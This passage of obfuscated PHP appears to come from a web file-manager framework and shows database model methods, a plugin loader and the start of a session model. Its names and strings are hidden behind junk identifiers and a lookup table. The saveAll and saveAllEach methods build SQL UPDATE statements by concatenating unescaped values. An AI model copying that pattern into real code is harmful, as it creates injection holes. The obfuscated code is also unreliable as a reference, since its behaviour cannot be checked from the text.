show_json($ĞÏôÎæŠ . LNG($­§©ßüã[423]) . "\50{$Ë¤é¹â‚}\51", !1); } protected function metaSet($›Ëö·ï›, $¿—ì¡ÂÙ = null, $´¸£”íç = null) { $·èÕèÓ =& $_SERVER[Ö†ØøÖ±]; if (!$this->tableMeta || !$›Ëö·ï›) { return !1; } $Ä’Åšê = $this->tableMeta[$·èÕèÓ[424]]; $½úúÒ« = $this->tableMeta[$·èÕèÓ[425]]; $±¿Í«ğ = Model($½úúÒ«); $õÎˆ©´½ = array($Ä’Åšê => $›Ëö·ï›, $·èÕèÓ[426] => $¿—ì¡ÂÙ); if (is_null($¿—ì¡ÂÙ)) { return $±¿Í«ğ->where(array($Ä’Åšê => $›Ëö·ï›))->delete(); } if (is_null($´¸£”íç) && is_string($¿—ì¡ÂÙ)) { return $±¿Í«ğ->where($õÎˆ©´½)->delete(); } $ƒÂûÜô = is_array($¿—ì¡ÂÙ) ? $¿—ì¡ÂÙ : array(); if (is_string($¿—ì¡ÂÙ)) { $ƒÂûÜô[$¿—ì¡ÂÙ] = $´¸£”íç; } $¦§§ = array(); foreach ($ƒÂûÜô as $”Åçéè => $’ïØ›ê´) { if (is_null($’ïØ›ê´) && is_string($”Åçéè)) { $±¿Í«ğ->where(array($Ä’Åšê => $›Ëö·ï›, $·èÕèÓ[426] => $”Åçéè))->delete(); continue; } $this->checkLength($’ïØ›ê´, !1, $½úúÒ« . $·èÕèÓ[4] . $”Åçéè); $¦§§[] = array($Ä’Åšê => $›Ëö·ï›, $·èÕèÓ[94] => $”Åçéè, $·èÕèÓ[427] => $’ïØ›ê´); } $øÌ°¤ê± = $·èÕèÓ[428] . $½úúÒ«; CacheLock::lock($øÌ°¤ê±); $±¿Í«ğ->where(array($Ä’Åšê => $›Ëö·ï›))->addAll($¦§§, array(), !0); CacheLock::unlock($øÌ°¤ê±); return !0; } public function metaGet($Åª½Ûâ, $Òù¾õê = false) { $ò·Ï´úˆ =& $_SERVER[Ö†ØøÖ±]; if (!$this->tableMeta) { return array(); } $»Ë¥Ÿß = $this->tableMeta[$ò·Ï´úˆ[424]]; $Ğ¤ÑÇÂñ = Model($this->tableMeta[$ò·Ï´úˆ[425]]); if ($Òù¾õê) { $ ˆ³„ù´ = array($»Ë¥Ÿß => $Åª½Ûâ, $ò·Ï´úˆ[94] => $Òù¾õê); return $Ğ¤ÑÇÂñ->where($ ˆ³„ù´)->getField($ò·Ï´úˆ[427]); } $ ˆ³„ù´ = array($»Ë¥Ÿß => $Åª½Ûâ); $º¸ÂÓ±á = $Ğ¤ÑÇÂñ->field($ò·Ï´úˆ[429])->where($ ˆ³„ù´)->select(); $º¸ÂÓ±á = array_to_keyvalue($º¸ÂÓ±á, $ò·Ï´úˆ[94], $ò·Ï´úˆ[427]); return $º¸ÂÓ±á; } private function checkDataAutoHas($¯÷£®Ò) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ã¯ïÜÜª) { if (in_array($¯÷£®Ò, explode($_SERVER[Ö†ØøÖ±][50], $ã¯ïÜÜª[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$À”»«’Ç, $éš¨õ—) { $Æ–¦áï =& $_SERVER[Ö†ØøÖ±]; if (!is_array($À”»«’Ç)) { return; } foreach ($this->dataAuto as $×µ¥Œ›) { $“–¿Í–Ù = $×µ¥Œ›[0]; if (!in_array($éš¨õ—, explode($Æ–¦áï[50], $×µ¥Œ›[2]))) { continue; } switch (trim($×µ¥Œ›[3])) { case $Æ–¦áï[374]: case $Æ–¦áï[375]: $®úä¹Ë£ = $×µ¥Œ›[1]; $’¤çİ = isset($×µ¥Œ›[4]) ? (array) $×µ¥Œ›[4] : array(); if ($®úä¹Ë£ == $Æ–¦áï[194] && array_key_exists($“–¿Í–Ù, $À”»«’Ç)) { if (!$À”»«’Ç[$“–¿Í–Ù]) { unset($À”»«’Ç[$“–¿Í–Ù]); } break; } if (isset($À”»«’Ç[$“–¿Í–Ù])) { array_unshift($’¤çİ, $À”»«’Ç[$“–¿Í–Ù]); } if ($Æ–¦áï[374] == $×µ¥Œ›[3]) { $À”»«’Ç[$“–¿Í–Ù] = call_user_func_array($®úä¹Ë£, $’¤çİ); } else { $À”»«’Ç[$“–¿Í–Ù] = call_user_func_array(array(&$this, $®úä¹Ë£), $’¤çİ); } break; case $Æ–¦áï[323]: if (isset($À”»«’Ç[$“–¿Í–Ù]) && $À”»«’Ç[$“–¿Í–Ù]) { $À”»«’Ç[$“–¿Í–Ù] = call_user_func_array(array(&$this, $×µ¥Œ›[1]), array($À”»«’Ç[$“–¿Í–Ù])); } break; case $Æ–¦áï[326]: $À”»«’Ç[$“–¿Í–Ù] = $À”»«’Ç[$×µ¥Œ›[1]]; break; case $Æ–¦áï[347]: if (isset($À”»«’Ç[$“–¿Í–Ù]) && !is_string($À”»«’Ç[$“–¿Í–Ù])) { $À”»«’Ç[$“–¿Í–Ù] = json_encode_force($À”»«’Ç[$“–¿Í–Ù]); } break; case $Æ–¦áï[376]: if ($À”»«’Ç[$“–¿Í–Ù] === $Æ–¦áï[12]) { unset($À”»«’Ç[$“–¿Í–Ù]); } break; case $Æ–¦áï[377]: $À”»«’Ç[$“–¿Í–Ù] = $×µ¥Œ›[1]; default: break; } } if ($éš¨õ— == $Æ–¦áï[408]) { $ËñÎ—é„ = strtolower($this->db->getDbType()); if (strpos($ËñÎ—é„, $Æ–¦áï[13]) !== 0) { return; } $Å¾¼‘¶ = $this->field(!0)->fields; $ç¥ŸÊ = $Å¾¼‘¶[$Æ–¦áï[305]]; if (isset($Å¾¼‘¶[$Æ–¦áï[304]])) { unset($ç¥ŸÊ[$Å¾¼‘¶[$Æ–¦áï[304]]]); } foreach ($ç¥ŸÊ as $ššûÙÅ³ => $éš¨õ—) { if (!isset($À”»«’Ç[$ššûÙÅ³])) { $À”»«’Ç[$ššûÙÅ³] = $Æ–¦áï[12]; } } } } private function dataAfterFilter(&$¼™½åæ) { $‘‘É¾¸° =& $_SERVER[Ö†ØøÖ±]; foreach ($this->dataAuto as $ÁåéÉãñ) { $ÖãæûÌ“ = $ÁåéÉãñ[0]; if (!isset($¼™½åæ[$ÖãæûÌ“])) { continue; } if (!in_array($‘‘É¾¸°[410], explode($‘‘É¾¸°[50], $ÁåéÉãñ[2]))) { continue; } switch (trim($ÁåéÉãñ[3])) { case $‘‘É¾¸°[374]: case $‘‘É¾¸°[375]: $¨ÖåúÂ¤ = isset($ÁåéÉãñ[4]) ? (array) $ÁåéÉãñ[4] : array(); array_unshift($¨ÖåúÂ¤, $¼™½åæ[$ÖãæûÌ“]); if (isset($ÁåéÉãñ[4]) && $ÁåéÉãñ[4] == $‘‘É¾¸°[430]) { $¨ÖåúÂ¤ = array($¼™½åæ[$ÖãæûÌ“]); } if ($‘‘É¾¸°[374] == $ÁåéÉãñ[3]) { $¼™½åæ[$ÖãæûÌ“] = call_user_func_array($ÁåéÉãñ[1], $¨ÖåúÂ¤); } else { $¼™½åæ[$ÖãæûÌ“] = call_user_func_array(array(&$this, $ÁåéÉãñ[1]), $¨ÖåúÂ¤); } break; case $‘‘É¾¸°[323]: if (isset($¼™½åæ[$ÖãæûÌ“]) && $¼™½åæ[$ÖãæûÌ“]) { $¼™½åæ[$ÖãæûÌ“] = call_user_func_array(array(&$this, $ÁåéÉãñ[1]), array($¼™½åæ[$ÖãæûÌ“])); } break; case $‘‘É¾¸°[326]: $¼™½åæ[$ÖãæûÌ“] = $¼™½åæ[$ÁåéÉãñ[1]]; break; case $‘‘É¾¸°[347]: $ãïõÇ÷˜ = $¼™½åæ[$ÖãæûÌ“]; $¼™½åæ[$ÖãæûÌ“] = json_decode($ãïõÇ÷˜, !0); if (is_null($¼™½åæ[$ÖãæûÌ“])) { $¼™½åæ[$ÖãæûÌ“] = $ãïõÇ÷˜; } break; case $‘‘É¾¸°[376]: if ($¼™½åæ[$ÖãæûÌ“] === $‘‘É¾¸°[12]) { unset($¼™½åæ[$ÖãæûÌ“]); } break; case $‘‘É¾¸°[377]: $¼™½åæ[$ÖãæûÌ“] = $ÁåéÉãñ[1]; break; default: break; } } } public function saveAll($¸âÍÈŞ«) { $â¶Ìè‹ =& $_SERVER[Ö†ØøÖ±]; $¼Œç¯ä‰ = $this->tablePrefix . $this->tableName; $ûúÓüÅ‘ = self::SQL_WHERE_IN_CHUNK; $¸âÍÈŞ« = is_array($¸âÍÈŞ«) ? $¸âÍÈŞ« : array(); $­¹âü¤ = $â¶Ìè‹[296]; $Ş¥öáÆÅ = 0; $‚¯©Ø á = array(); $Íæîƒá = count($¸âÍÈŞ«); for ($ß¶´›± = 0; $ß¶´›± < $Íæîƒá; $ß¶´›±++) { $İÃ”ñëä = $¸âÍÈŞ«[$ß¶´›±]; if (!is_array($İÃ”ñëä) || count($İÃ”ñëä) != 4) { continue; } $¦€Èº¶× = "\x55\120\x44\x41\x54\x45\40\x60{$¼Œç¯ä‰}\x60\40\x53\105\124\40{$İÃ”ñëä[2]}\40\x3d\x20\103\101\123\x45\x20{$İÃ”ñëä[0]}\x20\xa"; if ($Ş¥öáÆÅ == 0) { $­¹âü¤ = $¦€Èº¶×; } $‚¯©Ø á[] = $â¶Ìè‹[118] . $İÃ”ñëä[1] . $â¶Ìè‹[118]; $Ş¥öáÆÅ++; $­¹âü¤ .= "\40\x57\x48\105\116\40\x27{$İÃ”ñëä[1]}\47\x20\124\x48\105\116\40\47{$İÃ”ñëä[3]}\47\x20\12"; if ($Ş¥öáÆÅ == $ûúÓüÅ‘ || $ß¶´›± == $Íæîƒá - 1) { $™˜¤ùÖ• = implode($â¶Ìè‹[50], $‚¯©Ø á); $­¹âü¤ .= "\40\x45\x4e\104\x20\40\x57\110\x45\x52\x45\x20{$İÃ”ñëä[0]}\40\111\x4e\x20\x28{$™˜¤ùÖ•}\x29\40"; $this->execute($­¹âü¤); $Ş¥öáÆÅ = 0; $­¹âü¤ = $¦€Èº¶×; $this->chunkEventCheck(count($‚¯©Ø á)); $‚¯©Ø á = array(); } } $this->chunkEventSet(); } public function saveAllEach($İ²Ğ·¤ø) { $çËãÅå¿ =& $_SERVER[Ö†ØøÖ±]; $ƒØÉÏÏ¯ = $this->tablePrefix . $this->tableName; foreach ($İ²Ğ·¤ø as $Ì·à­“„) { if (!is_array($Ì·à­“„) || count($Ì·à­“„) != 4) { continue; } $ˆ™¦‰ß„ = $Ì·à­“„[0] . $çËãÅå¿[431] . $Ì·à­“„[1] . $çËãÅå¿[118]; $ğŞÑŒ§¿ = $Ì·à­“„[2] . $çËãÅå¿[431] . $Ì·à­“„[3] . $çËãÅå¿[118]; $ùòæ»¨æ = "\165\x70\144\x61\x74\x65\x20{$ƒØÉÏÏ¯}\x20\163\145\x74\x20{$ğŞÑŒ§¿}\x20\167\x68\145\x72\x65\x20{$ˆ™¦‰ß„}\x3b"; $this->execute($ùòæ»¨æ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¶ˆÑÃ³ª = false, $Ş¤ù†§‡ = false) { $this->_chunkEvent = $¶ˆÑÃ³ª; $this->_chunkEventParam = $Ş¤ù†§‡; } private function chunkEventCheck($€ ’û®Á) { if (!$this->_chunkEvent) { return; } $‡¤µ‰’ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‡¤µ‰’[$_SERVER[Ö†ØøÖ±][432]] = $€ ’û®Á; Hook::trigger($this->_chunkEvent, $‡¤µ‰’); } public function addAll($­Ö¦ÊáÏ, $´’ıß·º = array(), $«€¨ıá = false) { $ğ€àì´¤ =& $_SERVER[Ö†ØøÖ±]; ignore_timeout(); $ûØÜçÉÏ = self::SQL_WHERE_IN_CHUNK; if (empty($­Ö¦ÊáÏ)) { $this->error = think_lang($ğ€àì´¤[324]); return !1; } $´’ıß·º = $this->_parseOptions($´’ıß·º); foreach ($­Ö¦ÊáÏ as $›´¤óÎâ => $¼Ì»““½) { $­Ö¦ÊáÏ[$›´¤óÎâ] = $this->_facade($¼Ì»““½); $this->_beforeInsert($­Ö¦ÊáÏ[$›´¤óÎâ], $´’ıß·º); } if (method_exists($this->db, $ğ€àì´¤[325])) { for ($¿·êâ²˜ = 0; $¿·êâ²˜ < count($­Ö¦ÊáÏ); $¿·êâ²˜ += $ûØÜçÉÏ) { $Ìß®Ş«Â = array_slice($­Ö¦ÊáÏ, $¿·êâ²˜, $ûØÜçÉÏ); if (!is_array($Ìß®Ş«Â) || count($Ìß®Ş«Â) == 0) { break; } $“‹Ğ÷×ü = $this->db->insertAll($Ìß®Ş«Â, $´’ıß·º, $«€¨ıá); $this->chunkEventCheck(count($Ìß®Ş«Â)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($­Ö¦ÊáÏ as $›´¤óÎâ => $¼Ì»““½) { $“‹Ğ÷×ü = $this->db->insert($¼Ì»““½, $´’ıß·º, $«€¨ıá); } $this->commit(); } if (!1 !== $“‹Ğ÷×ü) { $ÚÂá×¬ = $this->getLastInsID(); if ($ÚÂá×¬) { return $ÚÂá×¬; } } return $“‹Ğ÷×ü; } public function save($¯‘·Ùú‰ = '', $·Ï À‰™ = array()) { $ÍÚÕÑÅì =& $_SERVER[Ö†ØøÖ±]; $•Öéêˆ  = self::SQL_WHERE_IN_CHUNK; $³ûÌŞšğ = $this->optionsValue(); $Åıèæ•ô = $this->findWhereField($³ûÌŞšğ); if (!$Åıèæ•ô) { return parent::save($¯‘·Ùú‰, $·Ï À‰™); } $Î¯¾ÉÁ¸ = 0; $ôò‰Ÿ = $³ûÌŞšğ[$ÍÚÕÑÅì[328]][$Åıèæ•ô][1]; $ôò‰Ÿ = is_array($ôò‰Ÿ) ? $ôò‰Ÿ : array(); $‘é–æê¤ = count($ôò‰Ÿ); for ($å¦±ƒĞä = 0; $å¦±ƒĞä < $‘é–æê¤; $å¦±ƒĞä += $•Öéêˆ ) { $ÄŠêúÛü = array_slice($ôò‰Ÿ, $å¦±ƒĞä, $•Öéêˆ ); if (!is_array($ÄŠêúÛü) || count($ÄŠêúÛü) == 0) { break; } $³ûÌŞšğ[$ÍÚÕÑÅì[328]][$Åıèæ•ô][1] = $ÄŠêúÛü; $this->optionsValue($³ûÌŞšğ); $Î¯¾ÉÁ¸ += parent::save($¯‘·Ùú‰, $·Ï À‰™); $this->chunkEventCheck(count($ÄŠêúÛü)); } $this->chunkEventSet(); return $Î¯¾ÉÁ¸; } public function add($„…ˆ¾Ë = '', $ËÇÚ¸¯ = array(), $œşÇñÌı = false) { if ($this->addTaskStatus && is_array($„…ˆ¾Ë)) { $this->addTaskData[] = $„…ˆ¾Ë; return; } return parent::add($„…ˆ¾Ë, $ËÇÚ¸¯, $œşÇñÌı); } public function parseWhereLike($ÚûÇ‰„, $“§³ä‹ø = '', $ÛÙ¬ëÄ = false, &$ææÖÍ§õ = false) { $ÀôàÕ›² =& $_SERVER[Ö†ØøÖ±]; $Ë‹¢´³ = $GLOBALS[$ÀôàÕ›²[6]][$ÀôàÕ›²[433]]; if (!$Ë‹¢´³[$ÀôàÕ›²[434]]) { return $ÚûÇ‰„; } if (!is_array($ÚûÇ‰„)) { return $ÚûÇ‰„; } $Œ¢ª² = array(); $—‡ºÊ„ = 0; foreach ($ÚûÇ‰„ as $‰ÃàÕƒà => $ş‘³Æü) { if (is_array($ş‘³Æü) && count($ş‘³Æü) == 2 && $ş‘³Æü[0] == $ÀôàÕ›²[435] && is_string($ş‘³Æü[1]) && substr($ş‘³Æü[1], 0, 1) == $ÀôàÕ›²[436] && substr($ş‘³Æü[1], strlen($ş‘³Æü[1]) - 1, 1) == $ÀôàÕ›²[436]) { $ææÖÍ§õ = !0; $ÒõÊÌùœ = is_string($‰ÃàÕƒà) ? $‰ÃàÕƒà : $“§³ä‹ø; $úÇã‰ç = substr($ş‘³Æü[1], 1, strlen($ş‘³Æü[1]) - 2); $úÇã‰ç = $this->db->escapeString($úÇã‰ç); if (!strpos($ÒõÊÌùœ, $ÀôàÕ›²[10])) { $ÒõÊÌùœ = $ÀôàÕ›²[437] . $ÒõÊÌùœ . $ÀôàÕ›²[437]; } $ÔæŞœÛÆ = $ÀôàÕ›²[203] . $úÇã‰ç . $ÀôàÕ›²[203]; $úÇã‰ç = str_replace(array($ÀôàÕ›²[10], $ÀôàÕ›²[438], $ÀôàÕ›²[11]), $ÀôàÕ›²[439], $úÇã‰ç); if ($Ë‹¢´³[$ÀôàÕ›²[440]]) { $ÔæŞœÛÆ = $ÀôàÕ›²[441] . $úÇã‰ç . $ÀôàÕ›²[442]; if ($Ë‹¢´³[$ÀôàÕ›²[443]]) { $ÔæŞœÛÆ = $ÀôàÕ›²[442] . $úÇã‰ç . $ÀôàÕ›²[441]; } } $Œ¢ª²[$—‡ºÊ„] = $ÀôàÕ›²[444] . $ÒõÊÌùœ . $ÀôàÕ›²[445] . $ÔæŞœÛÆ . $ÀôàÕ›²[446]; $—‡ºÊ„++; continue; } if (is_array($ş‘³Æü)) { $“§³ä‹ø = is_string($‰ÃàÕƒà) ? $‰ÃàÕƒà : $“§³ä‹ø; $ş‘³Æü = $this->parseWhereLike($ş‘³Æü, $“§³ä‹ø, !0, $ææÖÍ§õ); } if (is_numeric($‰ÃàÕƒà)) { $Œ¢ª²[$—‡ºÊ„] = $ş‘³Æü; $—‡ºÊ„++; } else { $Œ¢ª²[$‰ÃàÕƒà] = $ş‘³Æü; } } if ($ææÖÍ§õ && !$ÛÙ¬ëÄ) { } return $Œ¢ª²; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ƒó®®ö = array()) { $¾İ‡¬· =& $_SERVER[Ö†ØøÖ±]; $Î³×´ı = self::SQL_WHERE_IN_CHUNK; $“ô±í“° = $this->optionsValue(); $¾­”èû÷ = $this->findWhereField($“ô±í“°); if (!$¾­”èû÷ || isset($“ô±í“°[$¾İ‡¬·[345]]) || isset($“ô±í“°[$¾İ‡¬·[406]])) { return parent::select($ƒó®®ö); } $»¡Šûß = $“ô±í“°[$¾İ‡¬·[328]][$¾­”èû÷][1]; $»¡Šûß = is_array($»¡Šûß) ? $»¡Šûß : array(); $Õ¹İ²›¢ = null; for ($Àö†¡é» = 0; $Àö†¡é» < count($»¡Šûß); $Àö†¡é» += $Î³×´ı) { $ÅÇ…¡ø = array_slice($»¡Šûß, $Àö†¡é», $Î³×´ı); if (!is_array($ÅÇ…¡ø) || count($ÅÇ…¡ø) == 0) { break; } $“ô±í“°[$¾İ‡¬·[328]][$¾­”èû÷][1] = $ÅÇ…¡ø; $this->optionsValue($“ô±í“°); $ñÔ´†‚ğ = parent::select($ƒó®®ö); if (!$ñÔ´†‚ğ) { continue; } $Õ¹İ²›¢ = is_array($Õ¹İ²›¢) ? $Õ¹İ²›¢ : array(); $Õ¹İ²›¢ = array_merge($Õ¹İ²›¢, $ñÔ´†‚ğ); } return $Õ¹İ²›¢; } public function delete($É®¾©° = array()) { $¸®ŒÁ¼ =& $_SERVER[Ö†ØøÖ±]; $¦ªŠÜóå = self::SQL_WHERE_IN_CHUNK; $†ìÕĞ¤¹ = $this->optionsValue(); $ÂÎÊË‹ = $this->findWhereField($†ìÕĞ¤¹); if (!$ÂÎÊË‹) { return parent::delete($É®¾©°); } $–Ö½Å¶å = 0; $Ûí¬Á¶® = $†ìÕĞ¤¹[$¸®ŒÁ¼[328]][$ÂÎÊË‹][1]; $Ûí¬Á¶® = is_array($Ûí¬Á¶®) ? $Ûí¬Á¶® : array(); for ($½öÏŸ‹ı = 0; $½öÏŸ‹ı < count($Ûí¬Á¶®); $½öÏŸ‹ı += $¦ªŠÜóå) { $”ç•âéÚ = array_slice($Ûí¬Á¶®, $½öÏŸ‹ı, $¦ªŠÜóå); if (!is_array($”ç•âéÚ) || count($”ç•âéÚ) == 0) { break; } $†ìÕĞ¤¹[$¸®ŒÁ¼[328]][$ÂÎÊË‹][1] = $”ç•âéÚ; $this->optionsValue($†ìÕĞ¤¹); $–Ö½Å¶å += parent::delete($É®¾©°); } return $–Ö½Å¶å; } private function findWhereField($óëß»ì») { $’ĞĞ¸ïã =& $_SERVER[Ö†ØøÖ±]; $ÌœÊÖÛ = self::SQL_WHERE_IN_CHUNK; if (!is_array($óëß»ì») || !is_array($óëß»ì»[$’ĞĞ¸ïã[328]])) { return !1; } foreach ($óëß»ì»[$’ĞĞ¸ïã[328]] as $ºõÏ¾ç§ => $ú×µ§£î) { if (is_array($ú×µ§£î) && isset($ú×µ§£î[0]) && is_string($ú×µ§£î[0]) && strtolower($ú×µ§£î[0]) == $’ĞĞ¸ïã[7] && is_array($ú×µ§£î[1]) && count($ú×µ§£î[1]) > $ÌœÊÖÛ) { ignore_timeout(); return $ºõÏ¾ç§; } } return !1; } public function setMasterDB($ÙÕ´û ¦ = true) { think_config($_SERVER[Ö†ØøÖ±][447], $ÙÕ´û ¦); } } goto Cˆ½¸ÎÌ®; e”¯µ§©»£: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\160\154\x75\x67\x69\x6e\114\x69\163\x74"; public $field = array("\156\141\x6d\145", "\163\x74\141\x74\x75\163", "\x72\145\147\151\x65\163\x74", "\143\157\156\146\151\x67"); public function loadList($‡ù®Ô¬¥ = false) { $ö½áˆ» = array_to_keyvalue($this->listData(), $_SERVER[Ö†ØøÖ±][32]); if ($‡ù®Ô¬¥) { return $ö½áˆ»[$‡ù®Ô¬¥]; } return $ö½áˆ»; } public function init() { $­í×Óû =& $_SERVER[Ö†ØøÖ±]; Hook::trigger($­í×Óû[2017]); $î‰Ñ÷ªú = $this->loadPluginList(); foreach ($î‰Ñ÷ªú as $”éÊ–«Ø => $ƒÃúá×) { $Ğ«‹Õ”± = $this->appAllow($”éÊ–«Ø, $ƒÃúá×); if (!$Ğ«‹Õ”±) { continue; } foreach ($ƒÃúá×[$­í×Óû[2018]] as $ÜÁ¯‚ => $½ù¥‹ÛÍ) { Hook::bind($ÜÁ¯‚, $½ù¥‹ÛÍ); } } Hook::trigger($­í×Óû[2019]); Hook::trigger(ACTION); } public function appAllow($®µ€‚«, $öì¿æÄ, $Ôğ§¦ß = true) { $Å³¢†Û =& $_SERVER[Ö†ØøÖ±]; $éÉ°éò‹ = PLUGIN_DIR . $®µ€‚« . $Å³¢†Û[2020]; if (!is_array($öì¿æÄ) || !is_array($öì¿æÄ[$Å³¢†Û[2018]]) || $öì¿æÄ[$Å³¢†Û[803]] != 1 || !is_file($éÉ°éò‹)) { return !1; } if ($GLOBALS[$Å³¢†Û[545]] == 1) { if ($GLOBALS[$Å³¢†Û[6]][$Å³¢†Û[2021]] || !$GLOBALS[$Å³¢†Û[6]][$Å³¢†Û[2022]]) { return !0; } $İ‚öõ„— = explode($Å³¢†Û[50], strtolower($GLOBALS[$Å³¢†Û[6]][$Å³¢†Û[2022]])); return in_array(strtolower($®µ€‚«), $İ‚öõ„—) ? !1 : !0; } if ($Ôğ§¦ß && !Action($Å³¢†Û[2023])->checkAuth($®µ€‚«)) { return !1; } return !0; } public function unInstall($£»Ïò¡ä) { $œüï»¥ =& $_SERVER[Ö†ØøÖ±]; $©¤„Áã˜ = $this->loadList($£»Ïò¡ä); if (file_exists(PLUGIN_DIR . $£»Ïò¡ä)) { Hook::apply($£»Ïò¡ä . $œüï»¥[2024]); } $this->remove($©¤„Áã˜[$œüï»¥[451]]); } public function changeStatus($§¾€å, $ûÂû–íë) { $¢âÔ¸ƒÙ =& $_SERVER[Ö†ØøÖ±]; $×²šÏúÎ = $this->loadList($§¾€å); if ($ûÂû–íë) { Hook::apply($§¾€å . $¢âÔ¸ƒÙ[2025]); } $this->update($×²šÏúÎ[$¢âÔ¸ƒÙ[451]], array($¢âÔ¸ƒÙ[2026] => $ûÂû–íë)); } public function appRegist($“¥Ş§¸¥, $¦µŒ¯Ê) { $ íä¯ú =& $_SERVER[Ö†ØøÖ±]; $¼‰ÈªË† = $this->loadList($“¥Ş§¸¥); if ($¼‰ÈªË†) { $this->update($¼‰ÈªË†[$ íä¯ú[451]], array($ íä¯ú[2018] => $¦µŒ¯Ê)); } else { $ë˜°˜Âû = array($ íä¯ú[32] => $“¥Ş§¸¥, $ íä¯ú[2018] => $¦µŒ¯Ê, $ íä¯ú[803] => 0, $ íä¯ú[6] => $this->getConfigDefault($“¥Ş§¸¥)); $this->insert($ë˜°˜Âû); } } public function getConfigDefault($’…İ°Â‰) { $¯¹œ¼¿’ =& $_SERVER[Ö†ØøÖ±]; $´ç«ŒæÀ = array(); $Œ—ÁÅ = $this->getPackageJson($’…İ°Â‰); if (!$Œ—ÁÅ && is_array($Œ—ÁÅ[$¯¹œ¼¿’[2027]])) { return $´ç«ŒæÀ; } foreach ($Œ—ÁÅ[$¯¹œ¼¿’[2027]] as $è³÷ˆÕ© => $¦˜˜ÕÕë) { if (!isset($¦˜˜ÕÕë[$¯¹œ¼¿’[427]]) || isset($´ç«ŒæÀ[$è³÷ˆÕ©])) { continue; } $´ç«ŒæÀ[$è³÷ˆÕ©] = $¦˜˜ÕÕë[$¯¹œ¼¿’[427]]; } return $´ç«ŒæÀ; } public function getPackageJson($Øµí‰’å) { return Hook::apply($Øµí‰’å . $_SERVER[Ö†ØøÖ±][2028]); } public function getConfig($ìÃšæ§, $¨Ù˜—Å© = false) { $­ôè—• =& $_SERVER[Ö†ØøÖ±]; $¢Ö™ÒÀ– = array(); $—çŞ›Óˆ = $this->loadList($ìÃšæ§); if ($—çŞ›Óˆ && is_array($—çŞ›Óˆ[$­ôè—•[6]])) { $¢Ö™ÒÀ– = $—çŞ›Óˆ[$­ôè—•[6]]; } if (!$¢Ö™ÒÀ– || $¨Ù˜—Å©) { $¢Ö™ÒÀ– = $this->getConfigDefault($ìÃšæ§); } return $¢Ö™ÒÀ–; } public function setConfig($î­‹ã”†, $¢˜ÎÍ¹Ï = false) { $˜•Ğ ¤¾ =& $_SERVER[Ö†ØøÖ±]; $Â€¸Ãı = $this->loadList($î­‹ã”†); if (!$Â€¸Ãı) { return !1; } $‘ÛÛ“ãç = $Â€¸Ãı[$˜•Ğ ¤¾[6]]; if ($¢˜ÎÍ¹Ï == !1) { $‘ÛÛ“ãç = array(); $¢˜ÎÍ¹Ï = $this->getConfigDefault($î­‹ã”†); } foreach ($¢˜ÎÍ¹Ï as $×öå¦è => $Éâë’åÖ) { $‘ÛÛ“ãç[$×öå¦è] = is_string($Éâë’åÖ) ? trim($Éâë’åÖ) : $Éâë’åÖ; } $this->update($Â€¸Ãı[$˜•Ğ ¤¾[451]], array($˜•Ğ ¤¾[6] => $‘ÛÛ“ãç)); } public function viewList() { $ùØ«”ö =& $_SERVER[Ö†ØøÖ±]; $·í±ÁÙ = $this->loadList(); $this->pluginScan($·í±ÁÙ); $·í±ÁÙ = $this->loadPluginList(); $òÜ°¦Ïä = array(); foreach ($·í±ÁÙ as $ Üé÷· => $‰‹ÚÒú) { unset($‰‹ÚÒú[$ùØ«”ö[2018]], $‰‹ÚÒú[$ùØ«”ö[6]]); $ÒŒë = PLUGIN_DIR . $‰‹ÚÒú[$ùØ«”ö[32]] . $ùØ«”ö[2020]; if (!is_file($ÒŒë)) { continue; } $š©…öÒ = Hook::apply($‰‹ÚÒú[$ùØ«”ö[32]] . $ùØ«”ö[2028]); if (is_array($š©…öÒ)) { $òÜ°¦Ïä[$ Üé÷·] = array_merge($‰‹ÚÒú, $š©…öÒ); } } return $òÜ°¦Ïä; } private function loadPluginList() { $“¦Õå´‚ =& $_SERVER[Ö†ØøÖ±]; $¿”™¦Âö = $this->loadList(); if (strtolower(MOD) == $“¦Õå´‚[2029]) { return $¿”™¦Âö; } $Õêèó°÷ = Hook::trigger($“¦Õå´‚[2030], $¿”™¦Âö); if ($¿”™¦Âö && !$Õêèó°÷) { die; } return $Õêèó°÷ ? $Õêèó°÷ : $¿”™¦Âö; } private function pluginScan($Ù¨ñ¹€¾) { $Êâ…¡º =& $_SERVER[Ö†ØøÖ±]; recursion_dir(PLUGIN_DIR, $§´Ë¿·„, $ÀåÅõÁî, 0); foreach ($§´Ë¿·„ as $ôøÂ×Ì ) { $ßäÁêµ = get_path_this($ôøÂ×Ì ); if (isset($Ù¨ñ¹€¾[$ßäÁêµ]) || !file_exists($ôøÂ×Ì  . $Êâ…¡º[2031]) || !file_exists($ôøÂ×Ì  . $Êâ…¡º[2020])) { continue; } Hook::apply($ßäÁêµ . $Êâ…¡º[2025]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\137\x73\145\x73\x73\x69\x6f\156"; public function get($ÉÛ°”è) { $Ä‹ÒøŠ =& $_SERVER[Ö†ØøÖ±]; $”øÍ£¢† = $this->where(array($Ä‹ÒøŠ[2032] => $ÉÛ°”è))->find(); if (!is_array($”øÍ£¢†)) { return !1; } return $”øÍ£¢†[$Ä‹ÒøŠ[807]]; } public function set($ŞÑãÌÙ•, $Ó‹Ì‚±ç, $ËôûÅã» = 3600) { $¼ĞÀèß» =& $_SERVER[Ö†ØøÖ±]; $èíà¡Å = array($¼ĞÀèß»[2032] => $ŞÑãÌÙ•, $¼ĞÀèß»[1936] => $Ó‹Ì‚±ç, $¼ĞÀèß»[2033] => $ËôûÅã» + time()); if (Session::get($¼ĞÀèß»[2034])) { $èíà¡Å[$¼ĞÀèß»[1699]] = Session::get($¼ĞÀèß»[2034]); } else { $èíà¡Å[$¼ĞÀèß»[1699]] = 0; } if ($this->get($ŞÑãÌÙ•)) { return $this->where(array($¼ĞÀèß»[2032] => $ŞÑãÌÙ•))->save($èíà¡Å); } else { return 